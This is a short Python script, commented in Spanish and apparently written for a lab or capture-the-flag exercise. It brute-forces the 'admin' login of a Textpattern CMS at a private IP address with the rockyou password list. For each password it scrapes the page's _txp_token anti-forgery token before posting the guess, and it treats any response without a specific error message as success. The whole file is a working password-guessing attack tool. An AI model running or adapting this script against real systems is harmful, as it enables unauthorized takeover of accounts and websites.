import requests
from bs4 import BeautifulSoup

# URL base del login
url_login = "http://192.168.55.219/textpattern/textpattern/index.php"

# Usuario y lista de contraseñas
usuario = "admin"
password_list = "/usr/share/wordlists/rockyou.txt"

# Leer contraseñas
with open(password_list, "r", encoding="utf-8", errors="ignore") as f:
    passwords = f.read().splitlines()

# Sesión para manejar cookies
session = requests.Session()

for pwd in passwords:
    # 1. GET para obtener el token
    r = session.get(url_login)
    soup = BeautifulSoup(r.text, "html.parser")
    token_tag = soup.find("input", {"name": "_txp_token"})
    if not token_tag:
        print("No se encontró el token")
        break
    token = token_tag.get("value", "")

    # 2. POST con usuario, contraseña y token
    data = {
        "login_username": usuario,
        "login_password": pwd,
        "_txp_token": token
    }
    post = session.post(url_login, data=data)

    # 3. Verificar si el login fue exitoso
    if "Sorry, the form could not be submitted" not in post.text:
        print(f"[+] Contraseña válida encontrada: {pwd}")
        break
    else:
        print(f"[-] Intento fallido: {pwd}")


textpattern_bruteforce
